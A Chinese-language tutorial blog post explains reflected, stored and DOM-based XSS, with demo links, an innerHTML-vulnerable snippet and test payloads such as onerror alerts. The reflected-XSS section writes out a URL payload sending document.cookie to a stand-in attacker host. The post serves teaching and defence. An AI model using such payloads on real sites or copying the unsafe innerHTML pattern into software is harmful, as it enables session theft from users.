# Xss 攻击详解

## 前言

准备秋招的时候, 背了一些关于 Xss 的八股文, 但是没有深入了解, 所以当时面试回答的时候, 只能自己背的那部分说出来, 当面试官一深问时, 就回答不出来了, 直到现在有时间去研究 Xss 攻击, 才发现和自己背的八股文有一些区别。

文章中的 🌰 源代码都可以[在这里](https://github.com/itsuki0927/xss-demo)下载, **最好是自己运行一遍, 结合本文食用最佳**!!!

## 什么是 Xss 攻击

跨站脚本攻击(Xss)是一种代码注入攻击, 允许攻击者在其他用户的浏览器上执行恶意 JavaScript。

攻击者不会直接针对受害者, 而是利用受害者所访问网站的漏洞, 让该网站为他提供恶意代码, 而对于受害者的浏览器来说, 恶意 JavaScript 也是网站中合法的一部分, 从某种角度上来说, 网站成为了攻击者的帮凶。

## 什么是恶意 JavaScript

如果是我们自己写的 JavaScript, 那么我们能保证它们不是恶意的, 它在我们的可控范围内, 如果不是我们自己的业务代码(比如说第三方包、注入的脚本), 我们需要小心与甄别了, 特别是以下这三种情况:

1. JavaScript 可以访问用户的一些敏感信息, 比如说: document.cookie
2. JavaScript 可以通过使用 XMLHttpRequest、fetch 发送网络请求
3. JavaScript 可以通过使用 Dom Api 对页面进行任意的修改

你可能会想这会有什么危害呢? 留到下一节再讲。

## 恶意 JavaScript 的后果

没想到吧, 下一小节这么快就到了, 事实上我们打开一个网站的控制台, 我们可以执行任意的 JavaScript, 并不会对我们的计算机造成影响, 但是如果做了上面的"坏操作"的话, 就会有以下风险。

1. **盗取 cookie**: 攻击者通过 document.cookie 获取受害者的 cookie, 将 cookie 信息发送到攻击者的服务器, 然后再进行后面的攻击比如说 csrf, 或者提取其敏感信息。
2. **监听事件**: 攻击者通过`addEventListener`注册键盘输入事件, 然后将受害者所有的输入发送给攻击者, 其中可能包括账号密码等敏感信息。
3. **网站钓鱼**: 攻击者通过 Dom 操作, 然后仿造一个一模一样的登陆框覆盖掉之前网站原先的登陆, 并将提交地址指向攻击者服务器, 受害者不知情就直接提交其敏感信息。

尽管这些攻击有很大不同, 但是大体类似的, 都是通过注入恶意 JavaScript 到受害者网站, 然后在网站上下文中执行, 这看来是合法的, 它只是被当作网站中一个脚本, 可以执行受害者可以执行的任何操作, 访问受害者可以访问的任何数据,
如果受害者是管理员的话, 那么这种情况更加危险, 它可以访问所有数据并且可以做任意操作。

## Xss 攻击方式

Xss 攻击主要有三种方式:

1. 反射型 Xss: 恶意 JavaScript 来自网络请求。
2. 存储型 Xss: 恶意 JavaScript 来自数据库。
3. 基于 Dom: 漏洞存在于前端而不是后端。

## 反射型 Xss

反射型 Xss 是地第一种 Xss 攻击方式, 恶意 JavaScript 是网站请求的一部分, 当网站发送网络请求时, 网站将这个恶意 JavaScript 包含在响应体当中。

攻击者可以通过各种方式(在网站上放置链接、或者通过电子邮件发送链接)诱使用户发出指定的请求, 然后返回恶意脚本进行 Xss 攻击,。 攻击可以直接针对已知用户, 也可以对任意用户进行攻击。

### 流程

1. 攻击者制作一个恶意字符串的链接发送给受害者。
2. 受害者被诱骗点击恶意链接, 然后访问该恶意链接进入有漏洞的网站。
3. 网站后端进行处理返回拼接后的 html, html 中包含恶意 JavaScript。
4. 受害者的浏览器接收到响应后解析执行, 混入其中的恶意 JavaScript 也被执行(比方说: 将受害者的 cookie 发送给攻击者)。

一开始觉得反射型看起来无害, 因为它要求受害者自己发送包含恶意字符串的链接, 我们不可能说自己攻击自己, 但实际上更多的方式是通过伪装让受害者对自己发送反射型攻击:

- 针对特定的某一个人, 攻击者可以将恶意链接发送给受害者(比如说: 邮箱、短信、消息等)并诱使他去访问。
- 针对一群人, 攻击者可以发布指向恶意链接（比如说: 个人网站、群消息、公告等）并等待访问者点击它。

这两种方法是相似的，都是通过伪装的方式, 屏蔽掉恶意字符串的链接, 否则用户会识别它。

### 举个 🌰🌰🌰

看了上面流程, 可能还不太懂, 再来一个实际的例子, 这里有一个[在线 demo](https://codesandbox.io/s/refect-xss-demo-onzgo?file=/src/index.html)。

可以看到这样子的界面

![](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b847f132c1f34875881ce4a811829fc5~tplv-k3u1fbpfcp-zoom-1.image)

它有一个搜索功能, 在输入框上访问`/search?q=关键字`即可点击搜索按钮即可进行搜索, 因为这里主要是展示 xss 攻击, 所以就没有做真正的搜索。

所以当我们进行搜索的时候, 会有一个`q`的参数传递给后端。 所以有两种情况:

1. 正常 JavaScript: 假如我们输入`q=keywords`, 传递给后端的数据就是`{ q: 'keywords' }`, 这看起来没什么问题。
2. 恶意 JavaScript: 假如我们输入`q=<script>alert(1)</script>`, 传递给后端的是`{ q: '<script>alert(1)</script>' }`, 完蛋, 参数是恶意代码, 服务器直接渲染造成 xss 攻击。

当传入恶意 JavaScript 的时候, 这里我们已经造成了反射型 xss 攻击, 但是是对我们自己造成了 xss 攻击, 那么怎么对其他人造成反射型 xss 攻击呢?

按照上面那个流程, 我们再来走一遍:

1. 第一步: 找到查询参数这个漏洞之后, 我们发现可以制造一个带有恶意 JavaScript 的 URL, 比如说制作一个`/search?q=<script> window.location="www.attacker.com?cookie="+document.cookie </script>`。
2. 第二步: 然后通过邮箱、广告等方式诱使用户去点击,访问恶意链接的网站.
3. 第三步: 然后网站后端取出查询关键字, 这里对应的就是`<script>...</script>`, 然后进行拼接成 html, 然后将 html 返回给浏览器。
4. 第四步: 用户浏览器执行执行`<script>...</script>`里的内容, 然后就把当前网站的 cookie 发送给攻击者。

由此我们知道, **反射型 Xss 需要点击某一个链接或者说触发某一个操作访问一个有漏洞的网站, 然后网站后端接收到之后再进行处理该请求, 后端根据前端传递过来的数据生成了对应的 html 然后返回给前端**, 前端直接就进行了渲染, 那么反射是发生在哪里呢?

其实就是在后端处理的时候, 如果前端传递过来的数据本身就是恶意代码的话, 后端不会做一层过滤, 直接就渲染成了 html 然后返回给前端, 所以也就是在这里发生了所谓的"反射"。

继续拿上面那个例子, 当我们进行搜索时, 会渲染出关键字, 并且会展示搜索出来的结果。

URL 地址: `http://xxxx/search?keywords=javascript`。

**后端渲染之后返回给前端的 Html 结构**:

```html
<div>关键字: javascript</div>
<div>结果: xxxx</div>
```

输入`javascript`, 反射成`<div>关键字: javascript</div>`。

URL 地址: `http://xxxx/search?keywords=<script>alert(1)</script>`。

**后端渲染之后返回给前端的 Html 结构**:

```html
<div>
  关键字:
  <script>
    alert(1);
  </script>
</div>
<div>结果: xxxx</div>
```

输入`<script>alert(1)</script>`, 反射成了`<div>关键字: <script>alert(1)</script></div>`

### 关键点

所以结合上面的流程以及 demo, 我总结了以下两个关键点:

1. 反射型 Xss **后端不会将恶意 JavaScript 存储在数据库里, 并非是永久的**。
2. 反射型 Xss **是利用后端来进行反射**, 如果你自己在尝试反射型的 demo 的时候, 一直不成功, **可以看看是不是没有在后端做反射**。

## 存储型 Xss

当后端接收恶意数据并且存入数据库, 其他用户访问时返回给前端就会出现存储型 Xss(也被称为持久型 Xss)。

有问题的数据可能通过 HTTP 请求提交给后端, 例如: 博客评论、聊天室中的用户昵称或客户订单上的联系方式等。

### 流程

1. 攻击者提交恶意 JavaScript 发送网络请求, 后端接收到直接插入到数据库中。
2. 受害者进入该网站请求一个页面。
3. 该网站响应体数据中包含攻击者插入数据库的恶意 JavaScript, 然后发送给受害者。
4. 受害者的浏览器执行恶意 JavaScript。

### 举个 🌰🌰🌰

楼主自己在写 🌰 的时候, 发现它有两种场景的存储型攻击。

#### 后端返回 JSON 前端渲染

我们在做前后端分离项目的时候, 很多时候直接是返回 JSON 数据, 前端通过 post 等方式发送数据给后端, 后端没有做处理直接把数据存入数据库, 其他用户访问的时候, 后端返回了恶意代码的 json, 然后前端`vue`可能直接使用`v-html`这样的指令、`React`使用`danger`的属性去渲染数据, 结合我自己的实际例子, 在我的个人博客中, 发表评论时可以写 markdown 格式, 我前端请求接口后端给我返回数据, 然后前端渲染的时候是通过`marked.js`将评论字符串解析成 html 然后通过`danger`属性渲染出来的, 所以这个时候就会小心出现存储型 xss。

这里有一个[后端返回 JSON 前端渲染 🌰]()可以戳一戳。

#### 后端返回 html

是后端从数据库里面查出数据, 然后在后端根据数据生成好了 html 返回给前端, 所以前端直接渲染这个 html 就可以了, 这一点和反射型 xss 有一点相似。

[后端生成 html 🌰]()

#### 解释

通过上面的 🌰 相信你清楚了这个功能: 添加产品, 点击 add 按钮, 会有一个`prompt`弹框输入产品名称点击 ok 即可添加成功。

为了验证存储型 xss。 我们在添加产品的时候, 输入一个香蕉, 可以看到能够成功添加, 并且会在页面上展示出来。

Html 结构:

```html
<ol>
  <li>苹果</li>
  <li>香蕉</li>
</ol>
```

但是我们换一种方式再来捣乱一下, 输入一个`<img src='x' onerror='alert(1)' />`, 点击确定, 弹出来一个 1 , 我们再来看看最终的 Html 结构, 可以想想为什么不用之前的`<script>alert(1)</script>`, 后面再进行解释。

Html 结构:

```html
<ol>
  <li>苹果</li>
  <li>
    <img src="x" onerror="alert(1)" />
  </li>
</ol>
```

如果我们把恶意脚本的内容存储到数据库里, 然后其他用户浏览到这个网页进行查看的时候, 都会执行的恶意脚本内容, 这就是存储型的 Xss 攻击。

我之前看到一个 twitter 的帖子就是利用了存储型 xss 攻击, 当其他用户看到这条推文时, 自动点赞+转发。

![store-xss-demo](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f7177322b22d4de5b4e4f4c5f7cdf0cd~tplv-k3u1fbpfcp-zoom-1.image)

### 关键点

所以结合上面的流程以及 🌰, 我总结了以下两个关键点:

1. 存储型 Xss **会把恶意 JavaScript 保存到数据库中, 是持久型的**
2. 存储型 Xss 后端**不会进行反射, 只会在后端生成 html 返回或者后端返回恶意数据 JSON,前端使用"不可控"的方式渲染**

## 基于 Dom

像前面两种 xss 攻击方式, 它们都需要后端进行"配合", 反射型需要后端进行恶意代码"反射"给浏览器, 存储型需要后端将恶意代码"存储"到数据库, 那有没有一种不需要后端配合的呢?

基于 DOM 的 XSS 是一种发生在前端的 xss 攻击。它不会将恶意代码发送给后端, 后端返回的响应也不会包含恶意代码。

### 流程

1. 攻击者制作一个包含恶意字符串的 URL 并将其发送给受害者。
2. 受害者访问恶意字符串的 URL 链接。
3. 受害者浏览器恶意链接网站的响应后解析执行，前端 JavaScript 取出恶意代码并执行。
4. 恶意代码窃取用户数据并发送到攻击者的网站。

### 举个 🌰🌰🌰

还是拿搜索进行举例子, 当我们进行搜索时, 会渲染出关键字, 并且会展示搜索出来的结果。

代码如下

```html
<h1 id="keywords"></h1>
<div id="result"></div>

<script>
  const query = new URLSearchParams(location.search.slice(1));
  const keywords = document.getElementById('keywords');

  keywords.innerHTML = `关键字: ${query.get('keywords')}`;
</script>
```

然后有一个 URL 地址: `http://www.xxxx.com/search?keywords=javascript`。所以最后的结构如下

Html 结构:

```html
<div>关键字: javascript</div>
<div>结果: xxxx</div>
```

但是如果我们捣乱, 输入一个`<script>alert(1)</script>`, 这个时候会发生什么? 啥都没有发生, 我们看看最终的 Html 结构。

Html 结构:

```html
<div>
  关键字:
  <script>
    alert(1);
  </script>
</div>
<div>结果: xxxx</div>
```

没有问题的呀, 为什么不会弹出来 1 呢? 熟练的打开 MDN 文档, 搜索 innerHTML, 然后在文档中找到了这样子的一段解释。

> 尽管这看上去像`xss`攻击，并不会对页面造成什么影响。但是`HTML5` 中指定不执行由 `innerHTML` 插入的 `<script>`标签。

这也解释了为什么在存储型 xss🌰 中的时候不用`<script>`的方式了. 那么我们换一种方式再来捣乱一下, 输入一个`<img src='x' onerror='alert(1)' />`, 点击确定, 弹出来一个 1 , 我们再来看看最终的 Html 结构。

Html 结构:

```html
<div>关键字<img src="x" onerror="alert(1)" /></div>
<div>结果: xxxx</div>
```

通过这个例子就知道了基于 dom 的 xss 攻击, 是不会发送网络请求的, 它利用了一些网站的漏洞, 比方说 `document.url`、`document.location` 或 `document.referrer`。

### 区别

在前面反射型、存储型中, 都是利用到了后端没有做处理, 直接**将恶意代码插入到中 html**或者**返回恶意代码的数据**, 然后前端收到响应之后进行渲染, 把恶意代码当成页面中的一部分, 在页面加载时正常执行。

然而，在基于 DOM 的 XSS 攻击的示例中, 并没有后端的参与, **恶意脚本没有作为页面的一部分插入**; 而是在页面加载期间执行了自己的那一部分脚本, **然后在未来的某一个时刻触发了这个恶意脚本**。

就拿刚刚举例子的搜索功能来说, 我们在搜索的时候可以输入任意内容, 所以在输入恶意内容的时候, 也是没有问题的, 当我点击搜索按钮的时候, 这个恶意脚本插入到页面上自动执行了, 所以在这里"未来的某一个时刻"就是点击搜索的那一瞬间。

比如说利用输入来向页面添加 HTML。然后输入的时候没有做过滤, 然后这个时候在输入恶意内容的时候, 由于恶意字符串使用 插入到页面中 innerHTML，因此被解析为 HTML，从而导致执行恶意脚本。

但是基于 Dom 的 Xss, 没有作为 html 中的一部分插入到页面, 而是在页面加载期间自动执行的唯一脚本是页面的合法部分, 问题是这个合法的脚本直接利用用户输入来向页面添加 html, 由于使用了 innerHTML 等 api, 因为被解析成 html, 从而导致执行恶意代码。

区别到底是什么?

- 传统的 xss 攻击中, 后端将恶意代码作为 html 的一部分返回给浏览器, 在页面加载时正常执行。
- 基于 Dom 的 xss 攻击中, 由于页面的合法 JavaScript 以不安全的方式处理用户的输入, 因此会在页面加载完后的某一个时刻执行恶意脚本。

在上面例子中, 不安全的方式就是使用`innerHTML`插入内容, 然后在搜索的那一个时刻执行了恶意脚本。

### 出现的意义是什么?

在反射型、存储型中, 都要与后端通信, 假设我们后端代码是没有问题, 做好了安全防护, 不会出现问题, 那么是不是就可以认为不会有 xss 攻击。

但是, 随着现在 Web 程序越来越复杂, 后端现在只提供数据, 越来越多的内容由前端来进行渲染, 使用 javascript 在不刷新页面的情况进行局部更新, 使用 ajax 发送网络请求获取数据。

这就是意味着 Xss 攻击不仅仅只会存在于后端中, 还会存在于前端的 JavaScript 代码中, 因为即使后端做好了 Xss 防范, 在页面加载完成后, 前端也可能不安全地将用户输入插入在 Dom , 如果是这种情况, 就会发生基于 dom 的 xss 攻击, 而不是后端的问题。

## 写后感

以上就是我自己对 XSS 的一些理解, 写这篇文章的时候其实比较痛苦, 也问了很多朋友他们对 xss 攻击的理解, 其中看了很多的资料, 然后发现资料和之前了解到的出现了分歧, 就开始在想什么是对什么是错, 最简单的就是反射型 xss 攻击那里我就一直在想,是不是现在前后端分离, 后端只提供数据, 就不会出现反射型 xss 攻击了, 所以我在举例子的时候没有像存储型那样子举两个例子(后端返回 html、后端返回 json 数据), 有小伙伴知道的话可以评论告诉我一下下, 每天就在这样子的状态下写一点点, 最终才把这篇文章写完。

当自己去看总结好的八股文然后背下来的时候, 和别人去说明白真的就是两回事, 希望能对各位小伙伴们有帮助, **如果有什么错误或者建议希望各位小伙伴多多包涵并且评论里提出来, 我会努力去改正**, 加油, 🐛🦆!!!

## 参考资料

1. [Web Security - A7 . Cross-Site Scripting (XSS) - 上篇](https://ithelp.ithome.com.tw/articles/10218476)
2. [What is XSS (Cross-site Scripting)?](https://www.aptive.co.uk/blog/xss-cross-site-scripting/)
3. [DOM Based Cross Site Scripting or XSS of the Third Kind](http://www.webappsec.org/projects/articles/071105.shtml)
4. [Cross Site Scripting](http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting)
5. [Excess XSS](https://excess-xss.com/#summary)
6. [PostSwigger Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)
7. [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
